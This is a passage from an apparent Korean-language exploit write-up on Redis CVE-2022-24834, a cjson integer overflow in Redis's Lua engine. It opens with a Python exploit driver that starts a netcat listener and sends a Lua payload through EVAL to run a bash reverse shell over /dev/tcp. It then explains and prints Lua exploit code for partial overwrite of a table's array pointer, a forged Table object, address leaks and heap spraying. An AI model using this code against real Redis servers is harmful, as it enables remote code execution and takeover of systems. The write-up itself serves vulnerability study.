<span class="hljs-keyword">elif</span> isinstance(data, str):            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;$<span class="hljs-subst">{len(data)}</span>\r\n<span class="hljs-subst">{data}</span>\r\n&quot;</span>.encode()        <span class="hljs-keyword">elif</span> isinstance(data, bytes):            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;$<span class="hljs-subst">{len(data)}</span>\r\n&quot;</span>.encode() + data + <span class="hljs-string">b&quot;\r\n&quot;</span>        <span class="hljs-keyword">elif</span> isinstance(data, list):            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;*<span class="hljs-subst">{len(data)}</span>\r\n&quot;</span>.encode() + <span class="hljs-string">b&apos;&apos;</span>.join([self.prepare(elm) <span class="hljs-keyword">for</span> elm <span class="hljs-keyword">in</span> data])        <span class="hljs-keyword">elif</span> data <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;$-1\r\n&quot;</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;Non-RESP type: <span class="hljs-subst">{type(data)}</span>&quot;</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span>(<span class="hljs-params">self, argv</span>):</span>        self.conn = pwn.remote(self.host, self.port)        self.conn.send(self.prepare(argv))        <span class="hljs-comment">#self.conn.interactive()</span>        <span class="hljs-keyword">return</span> self.recv()    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv</span>(<span class="hljs-params">self</span>):</span>        t = self.conn.recv(<span class="hljs-number">1</span>)        <span class="hljs-keyword">if</span> t == <span class="hljs-string">b&apos;+&apos;</span> <span class="hljs-keyword">or</span> t == <span class="hljs-string">b&apos;-&apos;</span>:            <span class="hljs-keyword">return</span> self.conn.recvuntil(<span class="hljs-string">b&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>]        <span class="hljs-keyword">elif</span> t == <span class="hljs-string">b&apos;:&apos;</span>:            <span class="hljs-keyword">return</span> int(self.conn.recvuntil(<span class="hljs-string">b&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>])        <span class="hljs-keyword">elif</span> t == <span class="hljs-string">b&apos;$&apos;</span>:            s = int(self.conn.recvuntil(<span class="hljs-string">b&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>])            <span class="hljs-keyword">if</span> s == <span class="hljs-number">-1</span>:                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>            d = self.conn.recv(s)            self.conn.recvuntil(<span class="hljs-string">b&quot;\r\n&quot;</span>)            <span class="hljs-keyword">return</span> d        <span class="hljs-keyword">elif</span> t == <span class="hljs-string">b&apos;*&apos;</span>:            s = int(self.conn.recvuntil(<span class="hljs-string">b&quot;\r\n&quot;</span>)[:<span class="hljs-number">-2</span>])            <span class="hljs-keyword">return</span> [redis_recv(sock) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(s)]        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f&quot;What is this? <span class="hljs-subst">{t}</span>&quot;</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GET</span>(<span class="hljs-params">self, key</span>):</span>        <span class="hljs-keyword">return</span> self.cmd([<span class="hljs-string">&quot;GET&quot;</span>, key])    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">EVAL</span>(<span class="hljs-params">self, script</span>):</span>        <span class="hljs-keyword">return</span> self.cmd([<span class="hljs-string">&quot;EVAL&quot;</span>, script, <span class="hljs-string">&quot;0&quot;</span>])<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShellServer</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, lport=<span class="hljs-number">4444</span>, lhost=<span class="hljs-string">&apos;0.0.0.0&apos;</span></span>):</span>        self.lhost = lhost        self.lport = lport    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-comment">#l = pwn.listen(self.lport, self.lhost)</span>        <span class="hljs-comment">#target = l.wait_for_connection()</span>        <span class="hljs-comment">#target.interactive()</span>        subprocess.run([<span class="hljs-string">&quot;nc&quot;</span>, <span class="hljs-string">&quot;-lnvp&quot;</span>, str(self.lport)])<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    <span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">6</span>:        print(<span class="hljs-string">f&quot;USAGE: python <span class="hljs-subst">{sys.argv[<span class="hljs-number">0</span>]}</span> redis_host redis_port listen_host listen_port script_file&quot;</span>)        sys.exit(<span class="hljs-number">-1</span>)    redis_host, redis_port, lhost, lport, lua_script = sys.argv[<span class="hljs-number">1</span>:]        debug = <span class="hljs-literal">False</span>    print(<span class="hljs-string">f&quot;[*] Starting server on <span class="hljs-subst">{lhost}</span>:<span class="hljs-subst">{lport}</span>&quot;</span>)    shell_server = ShellServer(lport)    shell_server = threading.Thread(target=ShellServer().run)    shell_server.start()    print(<span class="hljs-string">f&quot;[*] Sending evil lua script to <span class="hljs-subst">{redis_host}</span>:<span class="hljs-subst">{redis_port}</span>&quot;</span>)    redis = Redis(redis_host, redis_port)    cmd = <span class="hljs-string">f&quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/<span class="hljs-subst">{lhost}</span>/<span class="hljs-subst">{lport}</span> 0&gt;&amp;1&apos;&quot;</span>.encode()    evil_lua_script = open(lua_script, <span class="hljs-string">&quot;rb&quot;</span>).read().replace(<span class="hljs-string">b&quot;[CMD]&quot;</span>, cmd)    r = redis.EVAL(evil_lua_script)    <span class="hljs-keyword">if</span> debug:        <span class="hljs-keyword">if</span> r: print(repr(r))<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    main()</code></pre><p>&#xC704; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; &#xBA85;&#xB839;&#xC904; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC740; &#xACF5;&#xACA9;&#xD560; Redis Server&#xC758; IP &#xC8FC;&#xC18C;&#xC640; port&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC11C;&#xBC84;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xACE0; RCE&#xB85C; &#xC2E4;&#xD589;&#xD55C; &#xB9AC;&#xBC84;&#xC2A4;&#xC258;&#xC744; &#xC704;&#xD574; listen&#xD560; host&#xC640; port&#xB97C; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9; &#xC778;&#xC790;&#xB85C;&#xB294; &#xC2E4;&#xD589;&#xD560; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xC5EC; &#xC811;&#xC18D;&#xD55C; Redis Server&#xC5D0;&#xC11C; <code>EVAL</code> &#xCEE4;&#xB9E8;&#xB4DC;&#xB85C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Remote-Code-Execution-Redis-Version-6-2-12-amp-7-0-11"><a href="#Remote-Code-Execution-Redis-Version-6-2-12-amp-7-0-11" class="headerlink" title="Remote Code Execution : Redis Version 6.2.12 &amp; 7.0.11"></a>Remote Code Execution : Redis Version 6.2.12 &amp; 7.0.11</h2><p>&#xADF8;&#xB7FC; &#xBA3C;&#xC800; Redis 6.2.12&#xC640; 7.0.11&#xC5D0;&#xC11C;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;!</p><h3 id="&#xC81C;&#xC57D;&#xC0AC;&#xD56D;"><a href="#&#xC81C;&#xC57D;&#xC0AC;&#xD56D;" class="headerlink" title="&#xC81C;&#xC57D;&#xC0AC;&#xD56D;"></a>&#xC81C;&#xC57D;&#xC0AC;&#xD56D;</h3><p>RCE &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xC704;&#xD574; &#xACE0;&#xB824;&#xD574;&#xC57C; &#xD560; &#xC0AC;&#xD56D;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xACFC;&#xB3C4;&#xD55C; Heap Corruption</li><li>Unicode escape&#xB41C; &#xB370;&#xC774;&#xD130;&#xC640; &#xC591; &#xB05D;&#xC758; &#xC81C;&#xC5B4; &#xBD88;&#xAC00;&#xB2A5;&#xD55C; double quote</li><li>ASLR &amp; PIE</li></ol><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB85C; Integer Overflow&#xC758; &#xACB0;&#xACFC; &#xB300;&#xB7C9;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; Overwrite&#xB418;&#xAE30;&#xC5D0; RCE&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC704;&#xD5D8;&#xC774; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xC4F0;&#xC774;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; unicode escape&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC644;&#xC804;&#xD788; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xB370;&#xC774;&#xD130;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9;&#xC740; &#xD56D;&#xC0C1; <code>&quot;</code>(0x22)&#xB85C; &#xB05D;&#xB098;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; redis-server &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; PIE&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xACE0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; ASLR&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xACBD;&#xC6B0; address leak&#xC774; &#xC694;&#xAD6C;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC740; <a href="https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_CVE-2023-21608/">&#xC774;&#xC804; &#xAE00;</a>&#xC5D0;&#xC11C; javascript&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; Lua&#xC758; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xBCC0;&#xC870;&#xD574;&#xC11C; &#xC784;&#xC758; &#xC8FC;&#xC18C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30; &#xB4F1;&#xC758; primitive&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD65C;&#xC6A9;&#xD574;&#xC11C; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C;&#xB294; Fake Closure object&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC11C; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="1-Partial-Overwrite-Table-array"><a href="#1-Partial-Overwrite-Table-array" class="headerlink" title="1. Partial Overwrite Table.array"></a>1. Partial Overwrite <code>Table.array</code></h3><p>Overflow&#xB420; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC628;&#xC804;&#xD788; &#xC81C;&#xC5B4;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAE30;&#xC5D0; Partial Overwrite&#xB85C; Lua&#xC758; <code>Table</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; <code>array</code> &#xD544;&#xB4DC;&#xB97C; &#xC870;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Lua&#xC758; &#xBAA8;&#xB4E0; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB294; &#xC544;&#xB798;&#xC758; <code>TValue</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC758;&#xD574; &#xAD00;&#xB9AC;&#xB418;&#xACE0; Lua&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xBCC0;&#xC218;&#xB97C; &#xB2E4;&#xB8E8;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">union</span> {  GCObject *gc;  <span class="hljs-keyword">void</span> *p;  lua_Number n;  <span class="hljs-keyword">int</span> b;} Value;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TValuefieldsValue value; int tt</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lua_TValue</span> {</span>  TValuefields;} TValue;</code></pre><p><code>int tt</code> &#xD544;&#xB4DC;&#xB294; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xD0C0;&#xC785;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xBA70; &#xC544;&#xB798;&#xC758; &#xAC12; &#xC911; &#xD558;&#xB098;&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TNONE(-1)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TNIL0</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TBOOLEAN1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TLIGHTUSERDATA2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TNUMBER3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TSTRING4</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TTABLE5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TFUNCTION6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TUSERDATA7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LUA_TTHREAD8</span></code></pre><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <code>Table</code>&#xC758; &#xC815;&#xC758;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Table</span> {</span>   CommonHeader;   <span class="hljs-comment">/*</span><span class="hljs-comment">      GCObject *next;</span><span class="hljs-comment">      lu_byte tt;</span><span class="hljs-comment">      lu_byte marked;</span><span class="hljs-comment">   */</span>   lu_byte flags;  <span class="hljs-comment">/* 1&lt;&lt;p means tagmethod(p) is not present */</span>   <span class="hljs-keyword">int</span> readonly;   lu_byte lsizenode;  <span class="hljs-comment">/* log2 of size of `node&apos; array */</span>   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Table</span> *<span class="hljs-title">metatable</span>;</span>   TValue *<span class="hljs-built_in">array</span>;  <span class="hljs-comment">/* array part, offset: 0x20 */</span>   Node *node;   Node *lastfree;  <span class="hljs-comment">/* any free position is before this position */</span>   GCObject *gclist;   <span class="hljs-keyword">int</span> sizearray;  <span class="hljs-comment">/* size of `array&apos; array, offset: 0x40 */</span>} Table;</code></pre><p>Lua&#xC5D0;&#xC11C; <code>local t = {}</code>&#xC640; &#xAC19;&#xC774; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xBA74; <code>Table</code> &#xAD6C;&#xC870;&#xCCB4;&#xC640; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xAC00;&#xB9AC;&#xD0AC; <code>TValue</code> &#xBC30;&#xC5F4;&#xC774; &#xD799;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xACE0; <code>TValue</code> &#xBC30;&#xC5F4;&#xC744; <code>Table</code>&#xC758;  <code>array</code> &#xD544;&#xB4DC;&#xAC00; &#xAC00;&#xB9AC;&#xCF1C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xD615;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/Untitled.png" alt="Untitled"></p><blockquote><p>&#xADF8;&#xB9BC;.1 <a href="https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html">&#xCD9C;&#xCC98;</a></p></blockquote><p>Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBC84;&#xD37C;&#xBCF4;&#xB2E4; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; <code>Table</code>&#xC758; <code>array</code>&#xB97C; Partial Overwrite&#xD558;&#xC5EC; LSB&#xB97C; <code>&quot;</code>(0x22)&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xBA74; &#xC2E4;&#xC81C; &#xBC30;&#xC5F4;&#xACFC; &#xAC00;&#xAE4C;&#xC6B4; &#xB2E4;&#xB978; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC8FC;&#xC18C;&#xC5D0; &#xC0AC;&#xC804;&#xC5D0; &#xAC00;&#xC9DC; &#xBC30;&#xC5F4;(fake array)&#xB97C; &#xAD6C;&#xC131;&#xD574;&#xB454;&#xB2E4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; Fake Object&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/Untitled%201.png" alt="Untitled"></p><blockquote><p>&#xADF8;&#xB9BC;.2 <a href="https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html">&#xCD9C;&#xCC98;</a></p></blockquote><h3 id="2-Fake-Table"><a href="#2-Fake-Table" class="headerlink" title="2. Fake Table"></a>2. Fake Table</h3><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC870;&#xC791;&#xB41C; <code>array</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xBC30;&#xC5F4;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xC6D0;&#xC18C;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; Fake Table&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> heap_addr_leaker = {}<span class="hljs-keyword">local</span> fake_array_base = addrof(heap_addr_leaker)...<span class="hljs-keyword">local</span> fake_table_template = ( <span class="hljs-comment">-- TString</span><span class="hljs-comment">-- TString -&gt; 0x18 bytes</span>   <span class="hljs-comment">-- typedef union TString {</span>      <span class="hljs-comment">-- L_Umaxalign dummy;  /* ensures maximum alignment for strings */</span>      <span class="hljs-comment">-- struct {</span>         <span class="hljs-comment">-- CommonHeader;</span>         <span class="hljs-comment">-- lu_byte reserved;</span>         <span class="hljs-comment">-- unsigned int hash;</span>         <span class="hljs-comment">-- size_t len;</span>      <span class="hljs-comment">-- } tsv;</span>   <span class="hljs-comment">-- } TString;</span>   <span class="hljs-string">&quot;SSSSSSSSFF&quot;</span> <span class="hljs-comment">-- (pad for address 0xXXXXXX2&apos;2&apos;) -- start from offset 0x18, until 0x22</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- *next</span>   .. <span class="hljs-string">&quot;\005&quot;</span> <span class="hljs-comment">-- tt (LUA_TTABLE)</span>   .. <span class="hljs-string">&quot;\001&quot;</span> <span class="hljs-comment">-- marked</span>   .. <span class="hljs-string">&quot;\000&quot;</span> <span class="hljs-comment">-- flags</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- ~ int readonly</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- _padding_ for  lu_byte lsizenode</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- *metatable</span>   .. p64(fake_array_base) <span class="hljs-comment">-- *array --&gt; low heap address</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- *node</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- *lastfree</span>   .. <span class="hljs-string">&quot;\000\000\000\000\000\000\000\000&quot;</span> <span class="hljs-comment">-- *gclist</span>   .. <span class="hljs-string">&quot;\255\255\255\127\000\000\000\000&quot;</span> <span class="hljs-comment">-- sizearray</span>)...</code></pre><p>&#xC774;&#xB807;&#xAC8C; &#xAD6C;&#xC131;&#xB41C; Fake Table&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; Fake Table&#xC758; <code>array</code> &#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD799;&#xC758; &#xB0AE;&#xC740; &#xC8FC;&#xC18C;&#xBD80;&#xD130; Fake Array&#xAC00; &#xD615;&#xC131;&#xB418;&#xACE0; Fake Table&#xC758; <code>sizearray</code> &#xAC00; <code>int</code> &#xC790;&#xB8CC;&#xD615; &#xCD5C;&#xB313;&#xAC12;&#xC778; 0x7fffffff&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC804;&#xCCB4; &#xD799; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <a href="https://hackyboiz.github.io/2024/08/04/pwndorei/1day1document_CVE-2023-21608/#1-Create-Corrupted-ArrayBuffer">CVE-2023-21608&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;</a>&#xC5D0;&#xC11C; <code>ArrayBuffer</code>&#xC758; size &#xD544;&#xB4DC;&#xB97C; &#xC870;&#xC791;&#xD574;&#xC11C; OOB access&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; &#xC6A9;&#xB3C4;&#xC778; &#xAC70;&#xC8E0;!&#x2026;</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/Untitled%202.png" alt="Untitled"></p><blockquote><p>&#xADF8;&#xB9BC;.3 <a href="https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html">&#xCD9C;&#xCC98;</a></p></blockquote><p> Lua&#xC5D0;&#xC11C;&#xB294; <code>Table</code> &#xB4F1;&#xC758; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC778;&#xC790;&#xB85C; <code>tostring</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xD799;&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xBC18;&#xD658;&#xB429;&#xB2C8;&#xB2E4;. <code>addrof</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD799;&#xC5D0; &#xC801;&#xC6A9;&#xB41C; ASLR&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; Fake Array&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xC778; <code>fake_array_base</code>&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="3-Heap-Feng-Shui-amp-Spary"><a href="#3-Heap-Feng-Shui-amp-Spary" class="headerlink" title="3. Heap Feng-Shui &amp; Spary"></a>3. Heap Feng-Shui &amp; Spary</h3><p>&#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xB9BC;.2&#xC640; &#xAC19;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xAD6C;&#xC131;&#xC744; &#xB9CC;&#xB4E4;&#xAE30; &#xC704;&#xD574; Heap Spary&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-keyword">local</span> fakes_s = {}<span class="hljs-keyword">local</span> fakes_t = {}<span class="hljs-keyword">local</span> fakes_num = <span class="hljs-number">100</span><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,fakes_num <span class="hljs-keyword">do</span>   fakes_s[i] = <span class="hljs-number">0</span>   fakes_t[i] = <span class="hljs-number">0</span><span class="hljs-keyword">end</span><span class="hljs-keyword">for</span> i=<span class="hljs-number">1</span>,fakes_num <span class="hljs-keyword">do</span>   fakes_s[i] = fake_table_template .. number_strings[i]   fakes_t[i] = {}<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> target_ptr = <span class="hljs-literal">nil</span><span class="hljs-keyword">for</span> i=fakes_num,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span> <span class="hljs-keyword">do</span>   <span class="hljs-comment">-- 0xXXXX22 fake table</span>   <span class="hljs-comment">-- 0xXXXX80 table</span>   <span class="hljs-comment">-- Note: Difference of addresses depends on #fakes_s[i]. DO NOT change the length</span>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">tostring</span>(fakes_t[i]):<span class="hljs-built_in">sub</span>(<span class="hljs-number">-2</span>) == <span class="hljs-string">&quot;80&quot;</span> <span class="hljs-keyword">then</span>      target_ptr = fakes_t[i]      <span class="hljs-keyword">break</span>   <span class="hljs-keyword">end</span><span class="hljs-keyword">end</span></code></pre><p><code>fakes_s</code> &#xC5D0;&#xB294; Fake Table&#xC744; &#xAD6C;&#xC131;&#xD558;&#xACE0; <code>fakes_t</code>&#xC5D0;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; <code>Table</code>&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xBC88;&#xAC08;&#xC544; Spary&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74; <code>fakes_t[i]</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; <code>Table</code>&#xC758; <code>array</code> &#xC8FC;&#xC18C;&#xAC00; 0xXXXX80&#xC77C; &#xB54C; 0xXXXX22&#xC758; &#xC8FC;&#xC18C;&#xC5D0; Fake Table&#xC774; &#xD615;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC870;&#xAC74;&#xC5D0; &#xB9DE;&#xB294; <code>fakes_t[i]</code>&#xB97C; <code>target_ptr</code>&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; Partial Overwrite&#xC758; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; &#xC0BC;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>target_ptr</code>&#xC744; Spary&#xD558;&#xC5EC; Partial Overwrite &#xC131;&#xACF5; &#xD655;&#xB960;&#xC744; &#xB192;&#xC774;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xD560; <code>spary_holder</code>&#xB97C; &#xCD08;&#xAE30;&#xD654;&#xD558;&#xACE0; &#xC774;&#xD6C4; &#xD560;&#xB2F9;&#xB418;&#xB294; &#xD799; &#xCCAD;&#xD06C;&#xAC00; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xC8FC;&#xC18C;&#xB97C; &#xAC16;&#xB3C4;&#xB85D; &#xB2E4;&#xC591;&#xD55C; &#xD06C;&#xAE30;&#xB85C; &#xC5EC;&#xB7EC; &#xBC88; &#xD560;&#xB2F9;&#xC744; 